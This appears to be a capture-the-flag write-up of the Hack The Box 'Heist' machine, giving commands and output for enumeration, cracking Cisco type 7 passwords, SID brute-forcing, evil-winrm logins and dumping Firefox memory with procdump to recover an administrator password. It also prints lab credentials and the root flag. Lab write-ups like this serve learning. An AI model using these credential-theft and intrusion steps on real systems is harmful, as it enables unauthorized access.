# Enumeration

## nmap

`nmap -sC -sV heist.htb`

Result
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-06 00:35 EST
Nmap scan report for heist.htb (10.129.96.157)
Host is up (0.18s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-06T05:35:34
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.77 seconds

```

port 80 http
port 135 msrpc Microsoft Windows RPC
port 445 microsoft-ds

## Website

Redirected to login form
Signin as guest
![[Pasted image 20230207114930.png]]
Attatchment
```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```

### Cisco password
Discussion between Hazard and Admin
```
username rout3r password 7 0242114B0E143F015F5D1E161713
rout3r:$uperP@ssword
```

```
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
Q4)sJu\Y8qz*A3?d
```

```
hazard:stealth1agent
```

## SMB
```
smbclient -L \\\\heist.htb -U hazard
Password for [WORKGROUP\hazard]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to heist.htb failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available

```

## rpcclient

```
rpcclient -U hazard heist.htb
```

```
srvinfo
        HEIST.HTB      Wk Sv NT SNT         
        platform_id     :       500
        os version      :       10.0
        server type     :       0x9003

```

## Impacket

```
cd /usr/share/doc/python3-impacket/examples
./lookupsid.py hazard:stealth1agent@heist.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Brute forcing SIDs at heist.htb
[*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```

## SMBmap

`smbmap -H heist.htb -u hazard -p stealth1agent`

![[Pasted image 20230207100049.png]]

## Nmap again

Check to see if winrm is open or not
```
nmap -sV -sC -p 5985 heist.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-06 20:10 EST
Nmap scan report for heist.htb (10.129.96.157)
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds
```


# Foothold

## Evil WinRM
```
evil-winrm -i heist.htb -u Chase -p "Q4)sJu\Y8qz*A3?d"
```


## Userflag
under Desktop

## Todo.txt
```
type todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```


# PrevEsc

## 

![[Pasted image 20230207105519.png]]

under `C:\inetpub\wwwroot` there is `login.php`
check the form of password

`cat login.php`
![[Pasted image 20230207105555.png]]

## Process
`get-process`
![[Pasted image 20230207102012.png]]

firefox is running so its possible that we can get user input since the login.php takes plaintext as password.

## Upload procdump
```
C:\Users\Chase\Desktop> upload /home/kali/Documents/WinTools/procdump.exe \Users\Chase\Desktop
```

## Get dump
```
./procdump.exe -ma 6652 -accepteula

ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[07:06:35] Dump 1 initiated: C:\Users\Chase\Desktop\firefox.exe_230207_070635.dmp
[07:06:35] Dump 1 writing: Estimated dump file size is 551 MB.
[07:06:37] Dump 1 complete: 551 MB written in 1.5 seconds
[07:06:37] Dump count reached.
```



## Firefox
CPU usage is high

cat firefox.exe_230207_070635.dmp | sls "login_password"

![[Pasted image 20230207105129.png]]

```
FirefoxMOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=ååååà)Û‚ühÙW!
```

password 4dD!5}x/re8]FBuZ

```
echo -n '4dD!5}x/re8]FBuZ' | sha256sum                           
91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040  -
```

## Login as Administrator

```
evil-winrm -i heist.htb -u Administrator -p '4dD!5}x/re8]FBuZ'
```
  

## Root flag
in desktop
```
cat root.txt
56016a5de1bd8ebd1d4f95798590d3f1
```